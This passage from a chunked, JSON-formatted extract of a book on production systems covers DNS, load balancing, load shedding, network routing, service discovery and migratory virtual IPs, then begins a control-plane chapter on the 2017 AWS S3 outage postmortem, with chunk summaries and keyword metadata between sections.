servers that can answer queries. What happens when those servers themselves are unavailable? It doesn’t matter how great the service’s availability is when callers can’t find out how to reach it. DNS can become neglected because it’s part of the invisible infrastructure. But a DNS outage can have a massive impact.\n\nThe main emphasis for DNS servers should be diversity. Don’t host them on the same infrastructure as your production systems. Make sure you have more than one DNS provider with servers in different locations. Use a different DNS provider still for your public status page. Make sure there are no failure scenarios that leave you without at least one functioning DNS server.\n\nRemember This\n\nWe covered a lot of ground in this section. It’s worth summarizing the uses and limitations of DNS.\n\nUse DNS to call services when they don’t change often.\n\nDNS round-robin offers a low-cost way to load-balance.\n\n“Discovery” is a human process. DNS names are supplied in configuration.\n\nDNS works well for global traffic management in coordination with local\n\nload balancers.\n\nDiversity is crucial in DNS hosts. Don’t rely on the same infrastructure\n\nfor DNS hosts and production services.\n\nLoad Balancing\n\nAlmost everything we build today uses horizontally scalable farms of instances that implement request/reply semantics. Horizontal scaling helps with overall capacity and resilience, but it introduces the need for load balancing. Load balancing is all about distributing requests across a pool of instances to serve all requests correctly in the shortest feasible time. In the previous section we looked at DNS round-robin as a means of load balancing. In this section we will consider active load balancing. This involves a piece of hardware or soft- ware inline between the caller and provider instances, as illustrated in the figure on page 178.\n\nreport erratum • discuss\n\nChapter 9. Interconnect • 178\n\npool Nadmininterface\n\nLoad Balancer\n\nServiceInstances\n\nVIP 1pool 1\n\nServiceInstances\n\npool 2\n\nVIP 3\n\nVIP 4NIC(s)\n\nVIP 2\n\nServiceInstances\n\nAll types of active load balancers listen on one or more sockets across one or more IP addresses. These IP addresses are commonly called “virtual IPs” or “VIPs.” A single physical network port on a load balancer may have dozens of VIPs bound to it, as shown above. Each of these VIPs maps to one or more “pools.” A pool defines the IP addresses of the underlying instances along with a lot of policy information:\n\nThe load-balancing algorithm to use • What health checks to perform on the instances • What kind of stickiness, if any, to apply to client sessions • What to do with incoming requests when no pool members are available\n\nTo a calling application, the load balancer should be transparent. At least, that’s the case when it works. If the client can tell there’s a load balancer involved, it’s probably broken.\n\nThe service provider instances sitting behind the proxy server need to generate URLs with the DNS name of the VIP rather than their own hostnames. (They shouldn’t be using their own hostnames anyway!)\n\nLoad balancers can be implemented in software or with hardware. Each has its advantages and disadvantages. Let’s dig into the software load balancers first.\n\nSoftware Load Balancing\n\nSoftware load balancing is the low-cost approach. It uses an application to listen for requests and dole them out across the pool of instances. This application is basically a reverse proxy server, as shown in the figure on page 179.\n\nreport erratum • discuss\n\nLoad Balancing • 179\n\nGET /index.html\n\nReverse Proxy Serverwww.example.com\n\nWeb Server 1ws1.example.com\n\nGET /index.html\n\n200 OK ...\n\nUser's Browser\n\n200 OK ...\n\nA normal proxy multiplexes many outgoing calls into a single source IP address. A reverse proxy server does the opposite: it demultiplexes calls coming into a single IP address and fans them out to multiple addresses. Squid,1 HAProxy,2 Apache httpd,3 and nginx4 all make great reverse proxy load balancers.\n\nLike DNS round-robin, reverse proxy servers do their magic at the application layer. As such, they aren’t fully transparent, but adapting to them isn’t onerous. Logging the source address of the request is useless, because it will represent only the proxy server. Well-behaved proxies will add the “X-Forwarded-For” header to incoming HTTP requests, so services can use a custom log format to record that.\n\nIn addition to load balancing, you can configure reverse proxy servers to reduce the load on the service instances by caching responses. This provides some benefits in reducing the traffic on the internal network. If the service instances are the capacity constraint in the system, then offloading this traffic improves the system’s overall capacity. Of course, if the load balancer itself is the constraint, then this has no effect.\n\nThe biggest reverse proxy server “cluster” in the world is Akamai. Akamai’s basic service functions exactly like a caching proxy. Akamai has certain advantages over Squid and HAProxy, including a large number of servers located near the end users, but is otherwise logically equivalent.\n\nBecause the reverse proxy server is involved in every request, it can get bur- dened very quickly. Once you start contemplating a layer of load balancing in front of your reverse proxy servers, it’s time to look at other options.\n\n1. 2. 3. 4.\n\nwww.squid-cache.org\n\nwww.haproxy.org\n\nhttp://httpd.apache.org\n\nhttps://nginx.org\n\nreport erratum • discuss\n\nChapter 9. Interconnect • 180\n\nHardware Load Balancing\n\nHardware load balancers are specialized network devices that serve a similar role to the reverse proxy server. These devices, such as F5’s Big-IP products, provide the same kind of interception and redirection capabilities as the reverse proxy software. Because they operate closer to the network, hardware load balancers provide better capacity and throughput, as illustrated in the following figure.\n\n200 OK ...\n\nHW Load Balancerwww.example.com\n\nWeb Server 1ws1.example.com\n\nGET /index.html\n\nUser's Browser\n\n200 OK ...\n\nWeb Server 2ws2.example.com\n\nGET /healthy.html\n\n200 OK ...\n\nGET /healthy.html\n\nGET /index.html\n\nHardware load balancers are application-aware and can provide switching at layers 4 through 7 of the OSI stack. In practice, this means they can load- balance any connection-oriented protocol, not just HTTP or FTP. I’ve seen these successfully employed to load-balance a group of search servers that didn’t have their own load managers. They can also hand off traffic from one entire site to another, which is particularly useful for diverting traffic to a failover site for disaster recovery. This works well in conjunction with global server load balancing (see Global Server Load Balancing with DNS, on page 175).\n\nThe big drawback to these machines is—of course—their price. Expect to pay in the five digits for a low-end configuration. High-end configurations easily run into six digits.\n\nHealth Checks\n\nOne of the most important services a load balancer can provide is service health checks. The load balancer will not send traffic to an instance that fails a certain number of health checks. Both the frequency and number of failed\n\nreport erratum • discuss\n\nLoad Balancing • 181\n\nchecks are configurable per pool. Refer back to Health Checks, on page 169, for some details about good health checks.\n\nStickiness\n\nLoad balancers can also attempt to direct repeated requests to the same instance. This helps when you have stateful services, like user session state, in an application server. Directing the same requests to the same instances will provide better response time for the caller because necessary resources will already be in that instance’s memory.\n\nA downside of sticky sessions is that they can prevent load from being dis- tributed evenly across machines. You may find a machine running “hot” for a while if it happens to get several long-lived sessions.\n\nStickiness requires some way to determine how to group “repeated requests” into a logical session. One common approach has the load balancer attach a cookie to the outgoing response to the first request. Subsequent requests are hashed to an instance based on the value of that cookie. Another approach is to just assume that all incoming requests from a particular IP address are the same session. This approach will break badly if you have a reverse-proxy upstream of the load balancer. It also breaks when a large portion of your customer base reaches you through an outbound proxy in their network. (Looking at you, AOL!)\n\nPartitioning Request Types\n\nAnother useful way to employ load balancers is “content-based routing.” This approach uses something in the URLs of incoming requests to route traffic to one pool or another. For example, search requests may go to one set of instances, while use-signup requests go elsewhere. A large-scale data provider may direct long-running queries to a subset of machines and cluster fast queries onto a different set. Of course, something in the requests must be evident to the load balancer.\n\nRemember This\n\nLoad balancers are integral to the delivery of your service. We cannot treat them as just part of the network infrastructure any more.\n\nLoad balancing plays a part in availability, resilience, and scaling. Because so many application attributes depend on them, it pays to incorporate load- balancing design as you build services and plan deployment. If your organi- zation treats load balancers as “those things over there” that some other team\n\nreport erratum • discuss\n\nChapter 9. Interconnect • 182\n\nmanages, then you might even think about implementing a layer of software load balancing under your control, entirely behind the hardware load balancers in the network.\n\nLoad balancing creates “virtual IPs” that map to pools of instances.\n\nSoftware load balancers work at the application layer. They’re low cost\n\nand easy to operate.\n\nHardware load balancers reach much higher scale than software load bal- ancers. They do require direct network access and specific engineering skills.\n\nHealth checks are a vital part of load balancer configuration. Good health checks ensure that requests can succeed, not just that the service is lis- tening to a socket.\n\nSession stickiness can help response time for stateful services.\n\nConsider content-aware load balancing if your service can process work-\n\nload more efficiently when it is partitioned.\n\nDemand Control\n\nIn the “good old days” of mainframes in glass houses, we could predict what the workload looked like from day to day. Operators would measure how many MIPS (millions of instructions per second...now don’t snicker, those machines did the best they could) a given job needed. Those days are long gone. Most of our services are either directly or indirectly exposed to the entire world’s population.\n\nOur daily reality is this: the world can crush our systems at any time. There’s no natural protection. We have to build it. There are two basic strategies: either refuse work or scale out. For the moment, we’ll consider when, where, and how to refuse work.\n\nHow Systems Fail\n\nEvery failing system starts with a queue backing up somewhere.\n\nWhen thinking about request/reply workload, we need to consider the resources being consumed and the queues to get access to those resources. That’ll let us decide where to cut off new requests. Each request obviously consumes a socket on each tier it passes through. While the request is active on an instance, that instance has one fewer ephemeral sockets available for new requests. In fact, that socket is consumed for a little while after the request completes. (See TIME_WAIT and the Bogons, on page 185.)\n\nreport erratum • discuss\n\nDemand Control • 183\n\nThere’s a relationship between the number of sockets available and the number of requests per second your service can handle. That relationship depends on the duration of the requests. (They are related via “Little’s law.”5) The faster your service retires requests, the more throughput it can handle. But we’re talking about systems under high levels of load. It’s natural to expect your service to slow down under heavy load, but that means fewer and fewer sockets are available to receive requests exactly when the most requests are coming in! We call that “going nonlinear,” and we don’t mean it in a good way.\n\nThe next resource to consider is raw I/O bandwidth through the NICs. No matter how many virtual NICs your machine has, or how many sockets your instance has open, Ethernet is inherently a serial protocol. It takes time to shove packets through the wires. Any packet you want to send while the port is busy just has to get in line. On the flip side, applications only receive packets when they are ready. Anything that arrives on the NIC in the meantime has to be buffered until the application calls some form of read on the socket. On both the transmit side and the receive side, a finite amount of RAM is allocated to these buffers. Any data that goes into those buffers has to work its way through the queue. When the write buffers are full, the TCP stack won’t accept any new writes and write calls will block. When the read buffers are full, the stack won’t accept any new incoming data and the connection will stall. (Eventually, that backs up into the sending application and the write call there also blocks.)\n\nWhen is the application most likely to be slow at reading from TCP buffers? Exactly when it’s under high load, another nonlinear effect.\n\nThere’s another kind of queue involved, which is the “listen queue” on the server’s socket. TCP connection requests can get through the three-phase handshake but then have to wait for the application to accept the connection. When the application calls accept, the server’s TCP stack removes the connection from the listen queue and hands it over for reads and writes. (See the “three- way handshake,” on page 37, for a refresher.) If a connection request sits in that queue long enough, the client will eventually give up and abandon the connection. If the listen queue is full, clients that attempt to connect will work their way through a series of delayed retries and then ultimately give up.\n\nAs requests from the outside world reach further into the system, they activate resources at every tier until the work can be retired. A single request at the network edge may translate into a tree of service requests through many layers of internal structure. Each request means transient load on a provider’s\n\n5.\n\nhttps://en.wikipedia.org/wiki/Little%27s_law\n\nreport erratum • discuss\n\nChapter 9. Interconnect • 184\n\nlisten queue and persistent load on its sockets and NICs. Under high load those resources are held longer, which further extends response times for the new incoming work. At some point, the response time for one or more services extends past the caller’s timeout. The caller will stop waiting for a response on the original request and probably fire a retry at us (exactly when it hurts the worst!).\n\nPreventing Disaster\n\nWith that perspective, we can see that the best thing to do under high load is turn away work we can’t complete in time. This is called “load shedding,” and it’s the most important way to control incoming demand.\n\nLoad shedding happens very quickly when a socket’s listen queue is full, and a quick rejection is better than a slow timeout.\n\nMore generally, we want to shed load as early as possible so we can avoid tying up resources at several tiers before rejecting the request. Load balancers near the network edge are the ideal place. A good health check on the first tier of services can inform the load balancer when response times are too high (in other words, higher than the service’s SLA). The load balancer also needs to be configured to send back an HTTP 503 response code when all instances fail their health checks. That’s a quick response to the caller that says “too busy, try later.”\n\nServices can measure their own response time to help with this. They can also check their own operational state to see if requests will be answered in a timely fashion. For instance, monitoring the degree of contention for a connection pool allows a service to estimate wait times. Likewise, a service can check response times on its own dependencies. If those dependencies are too slow and are required, then the health check should show that this service is unavailable. This provides back pressure through service tiers.\n\nServices should also have relatively short listen queues. Every request spends some time in the listen queue and some time in processing. We call the total of that time the “residence time.” If our service needs to respond in 100 mil- liseconds or less, that’s the allowed residence time. Many people go wrong by measuring just their own processing time. That’s why the service itself may think all is well while its consumers complain that it’s slow. The listen queue is serial while processing is multithreaded, so queuing time ultimately domi- nates processing time. The queuing math gets a bit hairy here, and Little’s law doesn’t apply very well when you hit boundaries and maximum queue length. You’ll need to know whether the service is exposed directly to the\n\nreport erratum • discuss",
      "page_number": 182,
      "chapter_number": 23,
      "summary": "DNS • 173\n\nSo as we look at the solutions in the rest of this chapter, it will be helpful to consider each in terms of the rate of change or dynamism it supports, how much operational support it requires, and how much global knowledge it requires Key topics include balance, balancer, and server.",
      "keywords": [
        "load balancing",
        "load",
        "DNS",
        "Server Load Balancing",
        "Hardware load balancers",
        "DNS round-robin load",
        "Global Server Load",
        "DNS server",
        "balancing",
        "Software Load Balancing",
        "DNS round-robin",
        "server",
        "Server Load",
        "Hardware Load",
        "round-robin load balancing"
      ],
      "concepts": [
        "balance",
        "balancer",
        "server",
        "request",
        "requests",
        "service",
        "instance",
        "network",
        "pool",
        "ips"
      ],
      "similar_chapters": [
        {
          "book": "Building Microservices",
          "chapter": 11,
          "title": "Microservices at Scale",
          "relevance_score": 0.44,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 8",
          "chapter": 49,
          "title": "Segment 49 (pages 472-480)",
          "relevance_score": 0.41,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 8",
          "chapter": 47,
          "title": "Segment 47 (pages 448-460)",
          "relevance_score": 0.4,
          "method": "sentence_transformers"
        },
        {
          "book": "Software Architecture",
          "chapter": 26,
          "title": "Segment 26 (pages 249-256)",
          "relevance_score": 0.4,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 3",
          "chapter": 51,
          "title": "Segment 51 (pages 488-496)",
          "relevance_score": 0.39,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 24,
      "title": "Segment 24 (pages 192-199)",
      "start_page": 192,
      "end_page": 199,
      "detection_method": "topic_boundary",
      "content": "Demand Control • 185\n\nInternet—an infinite source of demand for all practical purposes—or whether it’s internal, where the demand population is finite. (If you want to model this precisely, check out Dr. Neil Gunther’s “PDQ” analyzer toolkit.6) If you want to apply a heuristic, take your maximum wait time divided by mean processing time and add one. Multiply that by the number of request handling threads you have and bump it up by 50 percent. That’s a reasonable starting point for your listen queue length.\n\nBecause clients retry TCP connections, it can also be useful to run a “listen queue purge” when the service can’t keep up with demand. This is a kind of self-awareness that goes along with the idea of a “yellow alert” or “red alert” status. A listen queue purge just looks like a tight loop that accepts connec- tions and then immediately responds with a canned rejection. For example, you can have a string constant that just says 503 Try Again\\r\\n\\r\\n.\n\nTIME_WAIT and the Bogons\n\nA closed socket sits in the TIME_WAIT state for a bit to make sure that any stray packets wandering around the Internet either time out or arrive to be dropped. Suppose there were no such TIME_WAIT state. A server could close socket 32768 and then reallocate it to a new request. Meanwhile, a delayed packet could arrive that’s left over from the old connection. Under very rare circumstances, it might even have a sequence number that matches the server’s expectations. The server would seem to receive some bizarre data from nowhere. The current client didn’t send it, and now the TCP stream is out of sync. Such a packet is called a “bogon,” and TIME_WAIT is the antibogon protection.\n\nServices that only deal with work inside a data center can set a very low TIME_WAIT to free up those ephemeral sockets. Just be sure to reduce the machine’s TCP setting for the default “time to live” on packets accordingly. On Linux, take a look at the tcp_tw_reuse kernel setting.\n\nRemember This\n\nUnless you built your service in a cave with a box of scraps, it probably has to deal with Internet-scale load. Either it directly handles requests from the world at large, or it serves some other piece of code that does. We have no control over the traffic patterns and mercurial behavior of that population, so our services need to protect themselves when the load gets too heavy.\n\nReject work as close to the edge as possible. The further it penetrates into\n\nyour system, the more resources it ties up.\n\n6.\n\nwww.perfdynamics.com/Tools/PDQ.html\n\nreport erratum • discuss\n\nChapter 9. Interconnect • 186\n\nProvide health checks that allow load balancers to protect your applica-\n\ntion code.\n\nStart rejecting work when your response time is going to provoke retries.\n\nNetwork Routing\n\nBecause machines in a data center usually have multiple network interfaces, questions will sometimes arise about which interfaces particular kinds of traffic should traverse. For example, it’s relatively common to see a machine with a front-end network interface connected to one VLAN for communication to the web servers and a back-end network interface connected to a different VLAN for communication to the database servers. In this case, the server must be told which interface to use in order to reach a particular destination IP address.\n\nIn the case of nearby servers, the routes are probably easy; they’ll just be based on the subnet addresses. In the example of the application server, the back-end interface probably shares a subnet with the database server, while the front-end interface probably shares a subnet with the web servers. Routing gets a bit more complicated when distant services—perhaps third-party ser- vices—are involved.\n\nModern operating systems strive to make routing automatic and invisible. When a machine brings up its primary NIC (whichever one it happens to think is primary, anyway), it uses the main IP address for that NIC as its “default gateway.” That becomes the first entry in the routing table for the host. As the host gets cozier with its switches, they gossip about routes and the host updates its routing table. That table tells the operating system which NIC to use to reach a destination address or network. When an application sends a packet, the host checks the destination IP address against the routing table to see if it knows how to move that packet a hop closer to its destination.\n\nMost of the time, this “just works.” Occasionally, though, you can run into problems when multiple routes seem plausible to the host but aren’t actually equivalent. Consider the case of a service provided by a close business partner. If the integration includes personally identifiable information (PII), then you might set up a VPN rather than send sensitive data straight over the public Internet. Depending on a ton of configuration options that are outside your control, both the VPN and the primary switch may advertise routes that could reach the destination address.\n\nreport erratum • discuss\n\nNetwork Routing • 187\n\nIn the best case, you’ll discover this problem during testing because nothing will reach the partner’s service. Your service won’t be able to open a socket and will get a “destination unreachable” response.7 How is that the best case? A consistent error is much better than intermittent success. If the host hap- pens to receive route advertisements in the right order, it might send those sensitive packets over the VPN. If it gets them in the wrong order, it may try to send them over the front-end—in other words, the public—network. Here’s hoping the partner is better at networking and won’t accept connections. Otherwise, that PII will be sent in cleartext over the public Internet. Worse still, your service will appear to be working normally so you won’t even know it’s happening.\n\nOne solution is static route definitions. Network admins officially frown on static routes, but sometimes they’re the only way.\n\nAnother increasingly common solution to routing is software-defined network- ing. This goes hand-in-hand with virtualized infrastructure and container- based infrastructure. Containers and VMs use virtual IP addresses, VLAN tagging, and virtual switches to create a kind of “network on a network.” The packets still run over the same wires, but the host machine’s IP address is not involved. This lets the virtual switches operate independently of the physical ones. They can assign IPs from private pools, attach DNS names to those IPs to identify services, and dynamically create firewalls and subnets.\n\nUnreliable Enumeration\n\nIn one customer environment, we found that two different machines labeled their network interfaces in different orders. Both machines ran the same version of the same operating system. They were the same hardware model. But somehow, the leftmost network port on one machine appeared as the first network interface, while the leftmost network port on the other machine appeared as the second network interface. Imagine if “eth0” was the primary NIC on one machine but “eth1” was pri- mary on another. Yet both of them had “eth0” connected to the front-end switch.\n\nThat means the first machine had its default gateway properly set to the public-facing switch, while the second machine was trying to use an administrative switch to send out all its traffic.\n\nWe eventually found a low-level override in the host management controller—similar to the BIOS settings on a PC. For whatever reason, the two machines arrived with slightly different configurations, possibly because they were bought at different times.\n\n7.\n\nhttps://en.wikipedia.org/wiki/Internet_Control_Message_Protocol#Destination_unreachable\n\nreport erratum • discuss\n\nChapter 9. Interconnect • 188\n\nGetting these routing issues right requires paying attention to each and every integration point. Getting them wrong risks reduced availability or, worse, exposure of customer data. For each connection to a remote system, I recom- mend keeping a record in a spreadsheet or a database with the destination name, address, and desired route. Someday, somebody is going to need that information to write firewall rules anyway.\n\nDiscovering Services\n\nThere are two cases where service discovery becomes important. First, your organization may have too many services for DNS management to be practical. Second, you may be in a highly dynamic environment. Container-based environments usually hit both of these criteria, but that’s not the only case.\n\n“Service discovery” really has two parts. First, it’s a way that instances of a service can announce themselves to begin receiving a load. This replaces statically configured load balancer pools with dynamic pools. Any kind of load balancer—whether done with hardware or software—can do this. It doesn’t require a special “cloud aware” load balancer.\n\nThe second part is lookup. A caller needs to know at least one IP address to contact for a particular service. The lookup process can appear to be a simple DNS resolution for the caller, even if some super-dynamic service-aware server is supplying the DNS service.\n\nService discovery is itself another service. It can fail or get overloaded. It’s a good idea for clients to cache results for a short time.\n\nIt’s best not to roll your own service discovery. Like connection pools and crypto libraries, there’s a world of difference between writing one that works and writing one that always works.\n\nYou can build a service discovery mechanism on top of a distributed data store such as Apache ZooKeeper or etcd.8,9 In these cases, you’ll wrap the low-level access with a library to make it both easier and more reliable to use these databases. Just as an example, in the terminology of the CAP theorem,10 ZooKeeper is a “CP” system. That means when there’s a network partition (and there will be a network partition), some nodes won’t answer queries or accept writes. Since clients need to be available, they must have a fallback to use other nodes or previously cached results. It’s not reasonable to expect\n\n8. 9. 10. https://en.wikipedia.org/wiki/CAP_theorem https://coreos.com/etcd\n\nhttp://zookeeper.apache.org\n\nreport erratum • discuss\n\nMigratory Virtual IP Addresses • 189\n\nevery client to implement this behavior. Pinterest published a good experience report about using ZooKeeper for service discovery.11\n\nHashiCorp’s Consul resembles ZooKeeper in that it operates as a distributed database.12 However, Consul’s architecture places it in the “AP” arena, so it prefers to remain available and risk stale information when a partition occurs. In addition to service discovery it also handles health checks.\n\nSome other service discovery tools integrate directly with the control plane of PaaS platforms. For example, when Docker Swarm starts containers to run service instances, it automatically registers them with the swarm’s dynamic DNS and load-balancing mechanism.\n\nThis is a rapidly evolving space. As you can see, these tools have different considerations for each. They cover different scope and are subject to divergent behavior in failure cases. In fact, each one could occupy its own chapter, complete with cautions about sharp edges and detailed discussion about the boundary between the tools’ features and your applications’ responsibilities. Such chapters would probably be outdated by the time this book reaches print, or even epub, for that matter. There’s no plug-and-play replaceability. Choosing one is not a simple matter, and replacing one will have wide-reaching conse- quences. The only real answer here is to do your homework and commit to solving implementation challenges with whichever tool you choose.\n\nMigratory Virtual IP Addresses\n\nSuppose the server hosting a critical—but not natively clustered—application goes down. The cluster server on its failover node notices the lack of a regular heartbeat from the failed server. This cluster server then decides that the original server has failed. It starts up the application on the secondary server, including mounting any required filesystems. It also takes over the virtual IP address assigned to the clustered network interface.\n\nUnfortunately, the term virtual IP is overloaded. Generally speaking, it means an IP address that is not strictly tied to an Ethernet MAC address. Cluster servers use it to migrate ownership of the address between the members of the cluster. Load balancers use virtual IPs to multiplex many services (each with its own IP address) onto a smaller number of physical interfaces. There’s some overlap here, since load balancers typically come in pairs, so the virtual IP (as in “service address”) can also be a virtual IP (as in “migrating address”).\n\n11. https://medium.com/@Pinterest_Engineering/zookeeper-resilience-at-pinterest-adfd8acf2a6b 12. https://www.consul.io\n\nreport erratum • discuss\n\nChapter 9. Interconnect • 190\n\nThis kind of virtual IP address is just an IP address that can be moved from one NIC to another as needed. At any given time, exactly one server claims the IP address. When the address needs to be moved, the cluster server and the operating systems collaborate to do some funny stuff in the lower layers of the TCP/IP stack. They associate the IP address with a new MAC address (hardware address) and advertise the new route (ARP). The following figure depicts a virtual IP address before and after the active node fails.\n\nServer 1active\n\nSwitch 1\n\nReal IP172.16.64.190\n\nServer 2passive\n\nReal IP172.16.64.191Virtual IP172.16.67.10Before Failover\n\nServer 1failed\n\nSwitch 1\n\nReal IP172.16.64.190\n\nServer 2active\n\nReal IP172.16.64.191Virtual IP172.16.67.10After Failover\n\nThis kind of migratory IP address is often used for active/passive database clusters. Clients connect only using the DNS name for the virtual IP address, not to the hostnames of either node in the cluster. That way, no matter which node currently holds the IP address, the client can connect to the same name.\n\nOf course, this approach cannot migrate the in-memory state of the applica- tion. As a result, any nonpersistent state about interactions will be lost. For databases, this includes uncommitted transactions. Some database drivers —such as Oracle’s JDBC and ODBC drivers—will automatically reexecute queries that are aborted because of a failover. Updates, inserts, or stored procedure calls cannot be automatically repeated. Therefore, any application calling a database through a virtual IP should be prepared to get a SQLException when such a failover occurs.\n\nIn general, if your application calls any other service through a handoff virtual IP, it must be prepared for the possibility that the next TCP packet isn’t going to the same interface as the last packet. This can cause IOExceptions in strange places. The application logic must be prepared to handle that error—and handle it differently than just a “destination unreachable” error. If at all pos- sible, the application should retry its request against the new node (but see Circuit Breaker, on page 95, for some important safety limits on retries).\n\nreport erratum • discuss\n\nWrapping Up • 191\n\nWrapping Up\n\nWe looked at the interconnect layer in this chapter, where instances come together to form systems. Load balancing, routing, load shedding, and service discovery are some of the key issues to consider when building this layer. Depending on your organization, you may have existing solutions in place to plug into. That can be a big help, because some of the most powerful tools require operational support that makes them costly to support by a single team.\n\nNext, we continue zooming out to look at control over this whole extended mélange of application instances and infrastructure tools. We will see what it takes to deploy, monitor, and intervene with systems running in production.\n\nreport erratum • discuss\n\nCHAPTER 10\n\nControl Plane\n\nIn the preceding chapters we worked our way up from bare metal through layers of abstraction and virtualization to create a sea of instances running on machines. We’ve got software scattered around like an upended box of LEGO blocks. It’s up to the “control plane” to put these pieces in the right place and knit them together into a somewhat coherent whole.\n\nThe control plane encompasses all the software and services that run in the background to make production load successful. One way to think about it is this: if production user data passes through it, it’s production software. If its main job is to manage other software, it’s the control plane.\n\nA challenge we’ll face in this chapter is that the solution space is not well partitioned among tools, packages, and vendors. It’s nowhere near as simple as picking one download from each column. There are overlaps and gaps. Not every combination will work together. No single package does everything. We are left with a lot of integration effort and plenty of trial and error.\n\nHow Much Is Right for You?\n\nAs we look at the control plane, keep in mind that every part of this is optional. You can do without every piece of it, if you’re willing to make some trade-offs. For example, logging and monitoring helps with postmortem analysis, incident recovery, and defect discovery. Without it, all those will take longer or simply not be done. If you can live with extended outages, or if it’s okay to find out your software is down by getting a call from the CEO, then you don’t need that part of the control plane.\n\nIn a more palatable example, you don’t need IP management software if you’re running a static network on physical hardware. Up to a certain scale, this is probably acceptable and may be more cost-effective. Once you move to an\n\nreport erratum • discuss",
      "page_number": 192,
      "chapter_number": 24,
      "summary": "This chapter covers segment 24 (pages 192-199). Key topics include service, network, and time. Any data that goes into those buffers has to work its way through the queue.",
      "keywords": [
        "service",
        "time",
        "address",
        "load",
        "server",
        "network",
        "listen queue",
        "service discovery",
        "virtual",
        "queue",
        "TCP",
        "n’t",
        "application",
        "requests",
        "network interface"
      ],
      "concepts": [
        "service",
        "network",
        "time",
        "routing",
        "routes",
        "server",
        "load",
        "address",
        "addresses",
        "requests"
      ],
      "similar_chapters": [
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 62,
          "title": "Segment 62 (pages 631-638)",
          "relevance_score": 0.64,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 20,
          "title": "Segment 20 (pages 192-200)",
          "relevance_score": 0.63,
          "method": "sentence_transformers"
        },
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 4,
          "title": "Segment 4 (pages 25-32)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 8",
          "chapter": 47,
          "title": "Segment 47 (pages 448-460)",
          "relevance_score": 0.6,
          "method": "sentence_transformers"
        },
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 25,
          "title": "Segment 25 (pages 231-249)",
          "relevance_score": 0.6,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 25,
      "title": "Segment 25 (pages 200-207)",
      "start_page": 200,
      "end_page": 207,
      "detection_method": "topic_boundary",
      "content": "Chapter 10. Control Plane • 194\n\noverlay network with multiple VLANs and software switches, you’ll go mad without IP management.\n\nThe more sophisticated your control plane becomes, the more it costs to implement and operate. Every piece represents ongoing operational cost. Think of it like trading off the fixed cost of dedicated people versus the variable cost of speeding up deployments, incident recovery, provisioning services, and so on. If you’re small and the rate of change is low, you may find it’s not worth it. If you can amortize the cost of a platform team across hundreds of services deployed hundreds of times per year, then it makes a lot more sense.\n\nThis cost equation isn’t static, either. New open-source operations tools are released nearly every day. These are often created by a large-scale company scratching its own itch, but these companies release tools and libraries that lift up everyone else in the industry. When the first edition of this book was published in 2007, logging and monitoring was almost entirely a commercial market. Now it is almost entirely open source. At that time, automated provi- sioning of operating systems required either a large commercial package (six figures in license cost, six more in implementation cost) or a complete roll- your-own approach. Today, the hardest problem is choosing among all the fantastic alternatives!\n\nBottom line: Don’t assume you must install one of everything you read about. But also keep evaluating the overhead and difficulty of different solutions. The landscape changes pretty quickly.\n\nMechanical Advantage\n\n“Mechanical advantage” is the multiplier on human effort that simple machines provide. With mechanical advantage, a person can move something much heavier than themselves. With a long-enough lever and a place to stand, Archimedes claimed he could move Earth itself.\n\nThe kicker about mechanical advantage is that it works for good or for ill. High leverage allows a person to make large changes with less effort. We hope that those are mostly beneficial, such as releasing new software to a fleet of ten thousand machines. Unfortunately, there are many examples of automation gone wrong. Back in Force Multiplier, on page 80, we saw how Reddit suffered from overeager automation. The Governor pattern discussed in Governor, on page 123, aims to reduce the harm when automation goes the wrong way.\n\nLet’s consider an example from a real outage that affected many people and companies.\n\nreport erratum • discuss\n\nMechanical Advantage • 195\n\nOn February 28, 2017, Amazon Web Services’ S3 service in the US-East-1 region went down. Tens of thousands of companies suffered outages due to their own hard dependencies on S3. Large parts of the Net pretty much went dark. Operators went nuts. Users hammered status sites until those crumbled too. (At least, they hammered status sites that weren’t themselves hosted on S3!) The total disruption in S3 lasted about two hours, but it was many more hours before all the S3 consumers were healthy. It was “reboot day” for a big chunk of the SaaS market.\n\nAmazon, like other service providers, has learned that customer confidence can really be shaken with an event like this. One of the most important pieces of communication afterward is a postmortem review of the outage. Every postmortem review has three important jobs to do:\n\n1. Explain what happened.\n\n2. Apologize.\n\n3. Commit to improvement.\n\nAmazon’s write-up does a good job at all three of these.1 There are some really interesting lessons for us in that postmortem.\n\nSystem Failure, Not Human Error\n\nAmazon clearly states that “[a]n authorized S3 team member using an established playbook executed a command which was intended to remove a small number of servers for one of the S3 subsystems that is used by the S3 billing process. Unfortunately, one of the inputs to the command was entered incorrectly and a larger set of servers was removed than intended.” Parsing that just a little bit, we can understand that someone mistyped a command. First and foremost, whoever that was has my deepest sympathy. I’ve felt that shock and horror when I realized that I, personally, had just caused an outage. It’s a terrible feeling. But there’s much more that we should learn from this.\n\nTake a moment to read or reread that postmortem. The words “human error” don’t appear anywhere. It’s hard to overstate the importance of that. This is not a case of humans failing the system. It’s a case of the system failing humans. The administrative tools and playbooks allowed this error to happen. They amplified a minor error into enormous consequences. We must regard this as a system failure. “System” here means the whole system—S3 plus the control plane software and human processes to manage it all.\n\n1.\n\nhttps://aws.amazon.com/message/41926\n\nreport erratum • discuss\n\nChapter 10. Control Plane • 196\n\nThe second thing to note is that the playbook involved here had apparently been used before. But it hadn’t previously resulted in front-page news. Why not? For whatever reason, it worked before. We should try to learn from the successes as well as the failures. When the playbook was previously used, were the conditions different? There could be variations in any of the following:\n\nWho executed it? Was there a “second set of eyes”?\n\nWere there revisions to the playbook? Sometimes error-checking steps\n\nget relaxed over time.\n\nWhat feedback did the underlying system provide? Feedback may have\n\nhelped avert previous problems.\n\nWe tend to have postmortem reviews of incidents with bad outcomes. Then we look for causes, and any anomaly either gets labeled as a root cause or a contributing factor. But many times those same anomalies are present during “ordinary” operations, too. We give them more weight after an outage because we have the benefit of hindsight.\n\nWe also have many opportunities to learn from successful operations. Anomalies are present all the time, but most of the time they don’t cause out- ages. Let’s devote some effort to learning from those. Have postmortems for successful changes. See what variations or anomalies happened. Find out 